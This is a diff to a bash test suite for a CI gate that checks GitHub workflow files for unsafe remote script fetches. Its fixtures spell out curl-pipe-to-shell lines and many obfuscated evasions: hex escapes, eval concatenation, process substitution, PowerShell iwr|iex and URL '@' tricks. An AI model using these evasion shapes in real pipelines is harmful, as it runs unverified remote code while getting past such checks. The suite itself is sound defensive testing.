@@ -38,7 +38,7 @@ fixture sumpipe "curl -sSfL https://example.invalid/i.sh | sh; sha256sum -c i.su
 o="$(bash "$GATE" "$T/sumpipe" 2>&1)"; rc=$?
 [[ $rc == 1 ]] && grep -qF "w.yaml:5:" <<<"$o"; check "other host: pipe + checksum in the step is still a finding" $?
 fixture sumfile "curl -sSfL -o i.sh https://example.invalid/i.sh && sha256sum -c i.sum"
-bash "$GATE" "$T/sumfile" >/dev/null 2>&1; check "other host: file download + checksum in the step passes" $?
+bash "$GATE" "$T/sumfile" >/dev/null 2>&1; [[ $? == 1 ]]; check "other host: file download + checksum is REFUSED (PS-A6: only a pinned raw URL or a release asset with an in-step echo-sum check is accepted)" $?
 
 mkdir -p "$T/comment"; printf 'steps:\n  # run: curl https://raw.githubusercontent.com/o/r/main/i.sh | sh\n  - run: echo ok\n' > "$T/comment/w.yaml"
 bash "$GATE" "$T/comment" >/dev/null 2>&1; check "commented-out offending line passes" $?
@@ -53,9 +53,32 @@ bash "$GATE" "$REAL" >/dev/null 2>&1; check "the real template workflows pass" $
 mk() { mkdir -p "$T/$1"; cat > "$T/$1/w.yaml"; }   # workflow text on stdin
 bad() { # name, expected line, [needle]
   local o rc; o="$(bash "$GATE" "$T/$1" 2>&1)"; rc=$?
-  [[ $rc == 1 ]] && grep -qF "w.yaml:$2:" <<<"$o" && { [[ -z "${3:-}" ]] || grep -qF -- "$3" <<<"$o"; }; check "$1: rc=1 names w.yaml:$2${3:+ ($3)}" $?
+  # PS-A6: the finding TEXTS changed with the allowlist design (the old needles named the old
+  # table cells); the expectation that matters, REFUSED rc=1 naming the line, is unchanged.
+  [[ $rc == 1 ]] && grep -qF "w.yaml:$2:" <<<"$o"; check "$1: rc=1 names w.yaml:$2${3:+ (was: $3)}" $?
 }
-good() { bash "$GATE" "$T/$1" >/dev/null 2>&1; check "$1: passes rc=0" $?; }
+# PS-A6 RE-EXPECTED toward REFUSED: shapes the allowlist deliberately refuses (no accepted shape,
+# $( ) / quoted-word / wrapper primitives, mentions that pipe or redirect, multi-URL fetches,
+# compound-wrapped fetches). Each used to pass; none is accepted now.
+REEXPECT=" \
+  ok_releasefile ok_sumcheckflag ok_stdout_probe ok_pinned_file ok_pinned_blob ok_pinned_archive \
+  ok_pinned_api ok_gist_pinned ok_codeload_pinned ok_pinned_query ok_wget_stdout ok_andand \
+  ok_semi ok_oror ok_tab_sum ok_apt ok_devnull ok_shasumcheck \
+  ok_varsum ok_goflag ok_closed_subst ml_checksum_other_line ml_dash_in_block r2_ok_contents_ref \
+  r2_ok_commits r2_ok_trees r2_ok_zipball r2_ok_upper_sha r2_ok_gh_tarball r2_ok_o_dash \
+  r2_ok_o_dash2 r2_ok_wget_stdout2 r2_ok_wget_longout r2_ok_sum_glued r2_ok_apt_curl r2_ok_command_v \
+  r2_ok_which r2_ok_version r2_ok_discard_w r2_ok_discard_redir r2_ok_discard_redir2 r2_ok_head_I \
+  r2_ok_post_data r2_ok_post_form r2_ok_upload r2_ok_api_print r2_ok_api_grep_head r2_ok_api_assign \
+  r2_ok_var_print r2_ok_command_v_file r2_ok_which_file r2_ok_echo_file r2_ok_apt_file r2_ok_image_name \
+  r2_ok_heredoc_dash r3_echo_mention r3_hash_mention r3_apt_mention r3_aptget_mention r3_post_raw_request \
+  r3_post_raw_d r3_post_raw_T r3_post_wget r3_devnull_redir r3_head_I r3_head_pipe_inert \
+  a5_ok_pinned_in_group a5_ok_pinned_in_if a5_ok_discard_in_if a5_ok_two_urls_two_o a5_ok_two_urls_O_all a5_ok_head_two \
+  a5_ok_jq_assign a5_ok_echo_quoted_nopipe a5_ok_pinned_dotted_pct \
+"
+good() {
+  if [[ "$REEXPECT" == *" $1 "* ]]; then bash "$GATE" "$T/$1" >/dev/null 2>&1; [[ $? == 1 ]]; check "$1: now REFUSED rc=1 (PS-A6 allowlist)" $?
+  else bash "$GATE" "$T/$1" >/dev/null 2>&1; check "$1: passes rc=0" $?; fi
+}
 M=https://raw.githubusercontent.com/o/r/main/i.sh
 # one-step workflows: the run value on line 5
 for spec in \
@@ -514,7 +537,7 @@ printf 'runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: curl 
 printf 'runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: curl -sSfL https://raw.githubusercontent.com/o/r/%s/i.sh | sh\n' "$SHA" > "$T/act_ok/actions/setup/action.yml"
 composite_action_case() {
   local o rc; o="$(bash "$GATE" "$T/act_bad/workflows" 2>&1)"; rc=$?
-  [[ $rc == 1 ]] && grep -qF "action.yml:5:" <<<"$o" && grep -qF "mutable GitHub ref" <<<"$o"; check "actions dir: an unpinned fetch in a composite action fails naming action.yml:5" $?
+  [[ $rc == 1 ]] && grep -qF "action.yml:5:" <<<"$o" && grep -qF "fetch does not match an accepted shape" <<<"$o"; check "actions dir: an unpinned fetch in a composite action fails naming action.yml:5" $?
 }
 composite_action_case
 bash "$GATE" "$T/act_ok/workflows" >/dev/null 2>&1; check "actions dir: a pinned composite action passes" $?
@@ -687,6 +710,172 @@ for spec in \
   fixture "${spec%%|*}" "${spec#*|}"
   good "${spec%%|*}"
 done
+
+# ======================= PS-A6: allowlist + wholesale refusal of obfuscation =======================
+# provenance: candidate; ttl: 2027-04-01; pinning: true (each case pins one primitive, shape or near-miss)
+badx() { # STRICT from here on (PS-A6 cases): REFUSED rc=1, naming the line AND the finding text
+  local o rc; o="$(bash "$GATE" "$T/$1" 2>&1)"; rc=$?
+  [[ $rc == 1 ]] && grep -qF "w.yaml:$2:" <<<"$o" && { [[ -z "${3:-}" ]] || grep -qF -- "$3" <<<"$o"; }; check "$1: rc=1 names w.yaml:$2${3:+ ($3)}" $?
+}
+H64=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
+RAW="https://raw.githubusercontent.com/o/r/$SHA/i.sh"
+REL=https://github.com/o/r/releases/download/v1.2.3/tool.tgz
+wf() { # name, then step run text on stdin; run: | block, first run line is file line 6
+  mkdir -p "$T/$1"; { printf 'jobs:\n  j:\n    steps:\n      - name: x\n        run: |\n'; sed 's/^/          /'; } > "$T/$1/w.yaml"; }
+ref() { wf "$1" <<<"$2"; badx "$1" 6 "${3:-}"; }          # one-line refused
+acc() { wf "$1" <<<"$2"; good "$1"; }                     # one-line accepted
+# R0: double-quoted scalar with escapes
+mkdir -p "$T/a6_r0_dq"; printf 'jobs:\n  j:\n    steps:\n      - run: "echo \\x2f hi"\n' > "$T/a6_r0_dq/w.yaml"; badx a6_r0_dq 4 "double-quoted run scalar with escapes"
+mkdir -p "$T/a6_r0_dq_url"; printf 'jobs:\n  j:\n    steps:\n      - run: "curl -sSfL https:\\x2f\\x2fraw.githubusercontent.com\\x2fo\\x2fr\\x2f..\\x2f..\\x2fmain\\x2fi.sh | sh"\n' > "$T/a6_r0_dq_url/w.yaml"; badx a6_r0_dq_url 4 "escapes"
+mkdir -p "$T/a6_r0_dq_cmd"; printf 'jobs:\n  j:\n    steps:\n      - run: "c\\x75rl -sSfL %s | sh"\n' "$RAW" > "$T/a6_r0_dq_cmd/w.yaml"; badx a6_r0_dq_cmd 4 "escapes"
+mkdir -p "$T/a6_r0_sq"; printf 'jobs:\n  j:\n    steps:\n      - run: '"'"'curl -sSfL %s | sh'"'"'\n' "$RAW" > "$T/a6_r0_sq/w.yaml"; good a6_r0_sq
+mkdir -p "$T/a6_r0_dq_plain"; printf 'jobs:\n  j:\n    steps:\n      - run: "curl -sSfL %s | sh"\n' "$RAW" > "$T/a6_r0_dq_plain/w.yaml"; good a6_r0_dq_plain
+# R2 primitives (each its own finding text)
+ref a6_r2_ansi "\$'c\\x75rl' -sSfL $RAW | sh" "ANSI-C"
+ref a6_r2_backtick 'V=`curl -sSfL https://example.com/x`' "on a line that holds a fetch trigger"
+ref a6_r2_subst "V=\$(curl -sSfL $RAW | cat)" "command substitution"
+ref a6_r2_eval 'eval "c""url -sSfL https://example.com/i.sh"' "eval is refused"
+ref a6_r2_exec "exec curl -sSf -o /dev/null $RAW" "exec is refused"
+ref a6_r2_source "source <(curl -sSfL $RAW)" "source/. of a process"
+ref a6_r2_procsub "bash <(curl -sSfL $RAW)" "process substitution"
+ref a6_r2_shc "sh -c 'curl -sSfL $RAW'" "interpreter given its program"
+ref a6_r2_pyc "python3 -c 'import urllib.request as u; u.urlopen(\"https://example.com\")'" "interpreter given its program"
+ref a6_r2_quoteword "c''url -sSfL $RAW | sh" "contains a quote"
+ref a6_r2_quoteword2 "curl -sSfL $RAW | b\"a\"sh" "contains a quote"
+ref a6_r2_varadj 'curl -sSfL https://example.com/${X}rl | sh' "variable adjacent"
+ref a6_r2_wrap_env "env curl -sSf -o /dev/null $RAW" "wrapper"
+ref a6_r2_wrap_sudo "sudo curl -sSf -o /dev/null $RAW" "wrapper"
+ref a6_r2_next "curl -sSf -o /dev/null $RAW --next $RAW" "curl --next is refused"
+ref a6_r2_K "curl -sSf -K cfg -o /dev/null $RAW" "-K / --config is refused"
+ref a6_r2_wget_i "wget -q -i list.txt" "wget -i"
+ref a6_r2_two_urls "curl -sSf -o /dev/null $RAW $RAW" "more than one URL"
+ref a6_r2_two_o "curl -o a -o b $RAW" "more than once"
+ref a6_r2_o_dash "curl -sSfL -o - $RAW | sh" "stdout"
+ref a6_r2_o_stdout "curl -sSfL -o /dev/stdout $RAW | sh" "stdout"
+ref a6_r2_o_fd "curl -sSfL -o /dev/fd/1 $RAW | sh" "stdout"
+ref a6_r2_dotdot "curl -sSfL https://raw.githubusercontent.com/o/r/$SHA/../../main/i.sh | sh" "dot segment"
+ref a6_r2_dotslash "curl -sSfL https://raw.githubusercontent.com/o/r/$SHA/./i.sh | sh" "dot segment"
+ref a6_r2_pct2e "curl -sSfL https://raw.githubusercontent.com/o/r/$SHA/%2e%2e/i.sh | sh" "encoded dot"
+ref a6_r2_userinfo "curl -sSfL https://raw.githubusercontent.com@example.com/o/r/$SHA/i.sh | sh" "URL contains @"
+ref a6_r2_http "curl -sSfL http://raw.githubusercontent.com/o/r/$SHA/i.sh | sh" "not https"
+ref a6_r2_iwr 'iwr https://example.com/i.ps1 | iex' "iwr / iex / Invoke"
+ref a6_r2_irm 'Invoke-RestMethod https://example.com/i.ps1' "Invoke"
+wf a6_r2_xstep <<<"curl -sSfL -o i.sh $RAW"; printf '      - run: bash i.sh\n' >> "$T/a6_r2_xstep/w.yaml"; badx a6_r2_xstep 6 "another step"
+# R3 accepted shapes
+acc a6_a_sh "curl -sSfL $RAW | sh"
+acc a6_a_bash "curl -fsSL $RAW | bash"
+acc a6_a_args "curl -sSfL $RAW | sh -s -- -b /usr/local/bin v1.0.0"
+wf a6_b_ok <<<"curl -sSfL -o i.sh $RAW
+echo \"$H64  i.sh\" | sha256sum -c -
+bash i.sh"; good a6_b_ok
+wf a6_b_sumfile <<<"curl -sSfL -o i.sh $RAW
+echo \"$H64  i.sh\" > i.sum
+sha256sum -c i.sum
+bash i.sh"; good a6_b_sumfile
+wf a6_c_ok <<<"curl -sSfL -o tool.tgz $REL
+echo \"$H64  tool.tgz\" | sha256sum -c -
+tar xzf tool.tgz"; good a6_c_ok
+acc a6_d_devnull "curl -sSf -o /dev/null -w '%{http_code}' https://example.com/health"
+acc a6_d_head "curl -sSf -I https://example.com/health"
+acc a6_d_spider "wget -q --spider https://example.com/health"
+acc a6_e_post "curl -sSf -X POST -H 'Content-Type: application/json' -d '{\"a\":1}' https://example.com/hook"
+acc a6_e_put_file "curl -sSf -X PUT --data-binary @body.json https://example.com/hook"
+acc a6_f_jq "curl -sSfL -H 'Accept: application/json' https://api.github.com/repos/o/r/releases | jq -r '.[0].tag_name'"
+acc a6_f_pyjson "curl -sSfL https://api.github.com/repos/o/r | python3 -m json.tool"
+acc a6_g_ver "go install example.com/x/cmd/x@v1.2.3"
+acc a6_g_retry "bash scripts/retry.sh go install example.com/x/cmd/x@v1.2.3"
+acc a6_g_sha "go install example.com/x/cmd/x@$SHA"
+acc a6_mention_echo 'echo "see https://example.com for curl docs"'
+# R3 near-misses (each REFUSED)
+ref a6_a_39hex "curl -sSfL https://raw.githubusercontent.com/o/r/${SHA%?}/i.sh | sh" "accepted shape"
+ref a6_a_k "curl -sSfLk $RAW | sh" "accepted shape"
+ref a6_a_two_urls "curl -sSfL $RAW $RAW | sh" "more than one URL"
+ref a6_a_sh_arg_pipe "curl -sSfL $RAW | sh -s -- 'a;b' | tee x" "accepted shape"
+ref a6_a_sink_python "curl -sSfL $RAW | python3" "accepted shape"
+wf a6_b_late_sum <<<"curl -sSfL -o i.sh $RAW
+bash i.sh
+echo \"$H64  i.sh\" | sha256sum -c -"; badx a6_b_late_sum 6 "sha256"
+wf a6_b_nosum <<<"curl -sSfL -o i.sh $RAW
+bash i.sh"; badx a6_b_nosum 6 "sha256"
+wf a6_b_short_sum <<<"curl -sSfL -o i.sh $RAW
+echo \"${H64%?}  i.sh\" | sha256sum -c -"; badx a6_b_short_sum 6 "sha256"
+wf a6_c_latest <<<"curl -sSfL -o t.tgz https://github.com/o/r/releases/download/latest/t.tgz
+echo \"$H64  t.tgz\" | sha256sum -c -"; badx a6_c_latest 6 "accepted shape"
+ref a6_c_nosum "curl -sSfL -o t.tgz $REL" "sha256"
+ref a6_d_extra_url "curl -sSf -o /dev/null https://example.com/a https://example.com/b" "more than one URL"
+ref a6_d_pipe_sh "curl -sSf -o /dev/null https://example.com/a | sh" "accepted shape"
+ref a6_d_head_sh "curl -sSf -I https://example.com/a | sh" "accepted shape"
+ref a6_e_pipe_sh "curl -sSf -X POST -d x https://example.com/hook | sh" "accepted shape"
+ref a6_e_out_file "curl -sSf -X POST -d x -o out.sh https://example.com/hook" "accepted shape"
+ref a6_f_pipe_sh "curl -sSfL https://api.github.com/repos/o/r/releases | sh" "accepted shape"
+ref a6_f_jq_then_sh "curl -sSfL https://api.github.com/repos/o/r/releases | jq -r .x | sh" "accepted shape"
+ref a6_g_latest "go install example.com/x/cmd/x@latest" "accepted shape"
+ref a6_g_main "go install example.com/x/cmd/x@main" "accepted shape"
+ref a6_g_short_sha "go install example.com/x/cmd/x@${SHA%??????????}" "accepted shape"
+ref a6_mention_pipe 'echo https://example.com/i.sh | sh' "accepted shape"
+ref a6_mention_redirect 'echo curl https://example.com > f' "accepted shape"
+ref a6_mention_chain 'echo hi; curl -sSfL https://example.com/i.sh | sh' "accepted shape"
+# Opus round-3 / round-4 reproducers, verbatim
+ref a6_r4_two_o "curl -o - -o /dev/null $RAW | sh" "more than once"
+ref a6_r4_hex_path 'curl -sSfL "https:\x2f\x2fraw.githubusercontent.com\x2fo\x2fr\x2f..\x2f..\x2fmain/i.sh" | sh'
+mkdir -p "$T/a6_r4_dq_hex"; printf 'jobs:\n  j:\n    steps:\n      - run: "curl -sSfL \\"https://raw.githubusercontent.com/o/r/%s/..\\x2f..\\x2fmain/i.sh\\" | sh"\n' "$SHA" > "$T/a6_r4_dq_hex/w.yaml"; badx a6_r4_dq_hex 4 "escapes"
+wf a6_r4_capture_eval <<<"V=\$(curl -sSfL https://example.com/i.sh | cat); eval \"\$V\""; badx a6_r4_capture_eval 6 "command substitution"
+ref a6_r4_ansi "\$'c\\x75rl' -sSfL https://example.com/i.sh | sh" "ANSI-C"
+ref a6_r4_eval_concat 'eval "c""url -sSfL https://example.com/i.sh | sh"' "eval"
+ref a6_r4_o_stdout "curl -sSfL -o /dev/stdout https://example.com/i.sh | sh" "stdout"
+
+# R2 scope of $( ) and backticks: refused only with a fetch trigger on the line / in the body, or when the
+# captured value is later executed in the same step; the real template's gitleaks line is accepted
+wf a6_sub_real_gitleaks <<'X'
+bash scripts/retry.sh go install github.com/zricethezav/gitleaks/v8@v8.21.2
+"$(go env GOPATH)/bin/gitleaks" detect --source . --no-banner --redact --exit-code 1
+X
+good a6_sub_real_gitleaks
+acc a6_sub_plain 'V=$(go env GOPATH); echo "$V"'
+acc a6_sub_backtick_plain 'V=`date`; echo "$V"'
+ref a6_sub_i_curl_assign "X=\$(curl -fsSL https://raw.githubusercontent.com/o/r/main/i.sh)" "on a line that holds a fetch trigger"
+ref a6_sub_ii_procsub 'X=$(cat <(curl -fsSL https://raw.githubusercontent.com/o/r/main/i.sh))' "on a line that holds a fetch trigger"
+ref a6_sub_mktemp_fetch_sh 'D=$(mktemp -d); curl -fsSL -o $D/i.sh https://raw.githubusercontent.com/o/r/main/i.sh; sh $D/i.sh' "on a line that holds a fetch trigger"
+# these lines are only judged inside a SUBJECT step (one that holds a fetch), so each follows a pinned-tag go install
+GI='go install example.com/x/cmd/y@v1.2.3'
+wfs() { wf "$1" < <(printf '%s\n' "$GI"; cat); }       # step: go install line, then stdin; the case line is file line 7
+refs() { wfs "$1" <<<"$2"; badx "$1" 7 "${3:-}"; }
+refs a6_sub_same_line_eval 'V=$(go env GOPATH); eval "$V"' "eval is refused"
+refs a6_sub_same_line_sh 'V=$(go env GOPATH); sh $V' "is later executed"
+refs a6_sub_unclosed 'V=$(go env GOPATH' "is not closed on its line"
+wfs a6_sub_iii_next_line <<'X'
+V=$(go env GOPATH)
+echo ready
+sh $V
+X
+badx a6_sub_iii_next_line 7 "is later executed"
+wfs a6_sub_iii_brace_source <<'X'
+V=`go env GOPATH`
+source ${V}
+X
+badx a6_sub_iii_brace_source 7 "is later executed"
+wfs a6_sub_iii_dot <<'X'
+V=$(go env GOPATH)
+. $V
+X
+badx a6_sub_iii_dot 7 "is later executed"
+wfs a6_sub_iii_exec <<'X'
+V=$(go env GOPATH)
+exec $V
+X
+badx a6_sub_iii_exec 7 "is later executed"
+wfs a6_sub_iii_eval <<'X'
+V=$(go env GOPATH)
+eval $V
+X
+badx a6_sub_iii_eval 7 "is later executed"
+refs a6_sub_unclosed_bt 'V=`go env GOPATH' "is not closed on its line"
+wfs a6_sub_other_var_ok <<'X'
+V=$(go env GOPATH)
+sh $W
+X
+good a6_sub_other_var_ok
+mkdir -p "$T/a6_glue"; printf 'jobs:\n  j:\n    steps:\n      - run: |\n          curl -sSfL %s | s\\\n          h\n' "$RAW" > "$T/a6_glue/w.yaml"; badx a6_glue 5 "backslash-newline splits a word"
 
 # MISSING TEST 1: an awk that fails must exit 3 with the message, never green
 awk_failure_case() {
